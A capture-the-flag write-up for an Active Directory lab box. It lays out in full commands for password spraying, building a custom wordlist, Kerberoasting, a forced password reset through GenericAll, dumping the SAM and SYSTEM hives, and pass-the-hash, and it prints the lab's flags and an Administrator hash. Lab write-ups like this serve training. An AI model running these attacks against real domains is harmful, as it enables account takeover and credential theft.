# Middle Camp

Date: May 14–15, 2026
Target IP: 10.112.149.251

---

## About

```
The IT Team can't believe that you have made it past the first server. However, they feel confident that you won't make it much further.

Use all of the information gathered from your previous findings in order to keep making your way to the top.
```

## Tasks

1. What is the user flag?
2. What are the usernames found on the server? List the usernames in alphabetical order separated by a comma. Exclude the Administrator user.
3. What is the root flag?
4. What is the Administrator's NTLM hash?

*Seems like we're diving into some AD with these questions!*

---

## Initial Enumeration

```bash
nmap -sCV -p- -Pn -oN nmap/initial 10.112.149.251
```

![[Pasted image 20260514232711.png]]

**The full AD-stack!** Key services:

| Port       | Service  | Note                   |
| ---------- | -------- | ---------------------- |
| 88         | Kerberos | AS-REP / Kerberoasting |
| 389 / 3268 | LDAP     | AD enumeration         |
| 445        | SMB      | Shares, auth           |
| 3389       | RDP      | Backup access          |
| 5985       | WinRM    | Shell if we get creds  |

- **Domain:** `k2.thm`
- **DC:** `K2Server.k2.thm`

```bash
echo "10.112.149.251 k2.thm K2Server.k2.thm" >> /etc/hosts
```

---

## Credential Reuse from Base Camp

```bash
awk -F':' '{print $1}' creds.txt > users.txt 
awk -F':' '{print $2}' creds.txt > passwords.txt
```

```bash
nxc smb 10.112.149.251 -u users.txt -p passwords.txt --continue-on-success
```

![[Pasted image 20260514234213.png]]

Spraying against SMB returned nothing. The usernames from the web database don't match AD naming conventions, but the Linux machine's `/etc/passwd` revealed two full names: **James Bold** and **Rose Bud**.

Let's make a list with different variations of these two users!

![[Pasted image 20260514234935.png]]

### Username Format Discovery

Testing variations of the full names confirmed the domain format: `firstname.lastname` → `j.bold`, `r.bud`!

```bash
kerbrute userenum --dc K2SERVER -d k2.thm users.txt
```

![[Pasted image 20260515000349.png]]


```bash
nxc smb k2server.k2.thm -u 'j.bold' -p 'Pwd@9tLNrC3!'
SMB         10.112.149.251  445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.112.149.251  445    K2SERVER         [-] k2.thm\j.bold:Pwd@9tLNrC3! STATUS_LOGON_FAILURE
```

**2 key findings:**

`r.bud` works on `SMB` and `WinRM` but neither of them work for `j.bold`. His known password must have changed.

![[Pasted image 20260515001201.png]]

![[Pasted image 20260515001241.png]]

---

## WinRM as r.bud

```bash
evil-winrm -i k2server.k2.thm -u r.bud -p 'vRMkaVgdfxhW!8'
```

Two notes found in `C:\Users\r.bud\Documents\`:

![[Pasted image 20260515001734.png]]

**notes.txt:**

```
*Evil-WinRM* PS C:\Users\r.bud\Documents> type notes.txt
Done:
1. Note was sent and James has already performed the required action. They have informed me that they kept the base password the same, they just added two more characters to meet the criteria. It is easier for James to remember it that way.

2. James's password meets the criteria.

Pending:
1. Give James Remote Access.
```

**note_to_james.txt:**

```
*Evil-WinRM* PS C:\Users\r.bud\Documents> type note_to_james.txt
Hello James:

Your password "rockyou" was found to only contain alphabetical characters. I have removed your Remote Access for now.

At the very least adhere to the new password policy:
1. Length of password must be in between 6-12 characters
2. Must include at least 1 special character
3. Must include at least 1 number between the range of 0-999
```

**Takeaway:**
- `j.bold`'s base-password is `rockyou`
- 2 characters has been added
- Needs to be at least 1 special character and 1 number

---

## Custom Wordlist → j.bold Password

With this information we can generate a password list with a script then spray with `j.bold` against SMB and WinRM.

First I only had characters and number after `rockyou`, but it could just as well be added in front of it, so I did another attempt.
We got 320 passwords generated.

```python
import string

base = "rockyou"
special = "!@#$%^&*"
digits = string.digits

candidates = set()

for s in special:
    for d in digits:
        candidates.add(base + s + d)
        candidates.add(base + d + s)

        candidates.add(s + d + base)
        candidates.add(d + s + base)

with open("james_wordlist.txt", "w") as f:
    for word in sorted(candidates):
        f.write(word + "\n")

print(f"Generated {len(candidates)} passwords")
```

```bash
kerbrute bruteuser --dc k2server.k2.thm -d k2.thm james_wordlist.txt j.bold
```

![[Pasted image 20260515003638.png]]

**And we got a hit `#8rockyou`!**

---

## Dead Ends - SMB, WinRM & Kerberoasting

j.bold has access to SMB but nothing interesting in SYSVOL or NETLOGON.

```bash
nxc smb k2server.k2.thm -u 'j.bold' -p '#8rockyou' --shares
```

I looked at `SYSVOL` and `NETLOGON` but nothing interesting. 

```
smbclient //k2server.k2.thm/SYSVOL -U 'k2.thm\j.bold%#8rockyou'
smbclient //k2server.k2.thm/NETLOGON -U 'k2.thm\j.bold%#8rockyou'
```

![[Pasted image 20260515004030.png]]

![[Pasted image 20260515004143.png]]

**No SMB shares or WinRM?!**

Kerberoasting was next, maybe there's a service account with an SPN to crack.

```
impacket-GetUserSPNs k2.thm/j.bold:'#8rockyou' -dc-ip 10.112.149.251 -request
```

![[Pasted image 20260515004619.png]]

Nothing here either. Three walls in a row, time to let BloodHound show the full picture instead.

---

## BloodHound Enumeration

Let's see where we are instead with BloodHound.

```
bloodhound-python -u j.bold -p '#8rockyou' -d k2.thm -dc K2SERVER.k2.thm -c all --dns-tcp --dns-timeout 30 -ns 10.112.149.251
```

**Jackpot!**
With GenericAll I can change `j.smith`'s password directly and have full control over it.

![[Pasted image 20260515010814.png]]


**Attack path discovered**
```
j.bold → [MemberOf] → IT STAFF 1 → [GenericAll] → j.smith
```

---

## GenericAll → Force Password Reset

```bash
net rpc password j.smith 'NewPass123!' -U k2.thm/j.bold%'#8rockyou' -S 10.112.149.251
```

```bash
nxc smb k2.thm -u j.smith -p 'NewPass123!'   # Valid
nxc winrm k2.thm -u j.smith -p 'NewPass123!'  # Pwn3d!
```

He has access to both SMB and WinRM, no interesting shares tho so I will dive into WinRM.
![[Pasted image 20260515011240.png]]

---

## WinRM as j.smith

On `j.smith`'s Desktop we find the user flag!

**User flag:** `THM{3e5a19a9ba91881f4d7852d92126a97f}`

---

## Privilege Escalation

`j.smith` is a member of **Backup Operators** group, a built-in privileged group that grants the ability to read any file on the system, including the SAM and SYSTEM registry hives.

![[Pasted image 20260515011826.png]]

To get the Administrator-hash we need the `SAM` and `SYSTEM` registries.

```powershell
reg save HKLM\SAM sam.reg
reg save HKLM\SYSTEM system.reg
```

![[Pasted image 20260515013119.png]]

Then we use **Evil-WinRM** to download them onto Kali.

```powershell
download sam.reg
download system.reg
```

With these downloaded, we can use `secretsdump` to extract the hashes!

```
impacket-secretsdump -sam sam.reg -system system.reg LOCAL
```

![[Pasted image 20260515133652.png]]

And there's the hash for `Administrator`!

**Administrator hash:** `9545b61858c043477c350ae86c37b32f`

Now we log in with Administrator and get the root flag!

```
evil-winrm -i k2server.k2.thm -u Administrator -H 9545b61858c043477c350ae86c37b32f
```

![[Pasted image 20260515134308.png]]

![[Pasted image 20260515134531.png]]

**Root flag:** `THM{a7e9c8149fec53865eff983143b1f5ba}`

---

## Usernames on the Server (Alphabetical)

```
j.bold, j.smith, r.bud
```

---

## Credentials Carried Forward

The Administrator NTLM hash is the key artefact taken into The Summit:

```
Administrator hash: 9545b61858c043477c350ae86c37b32f
```


---
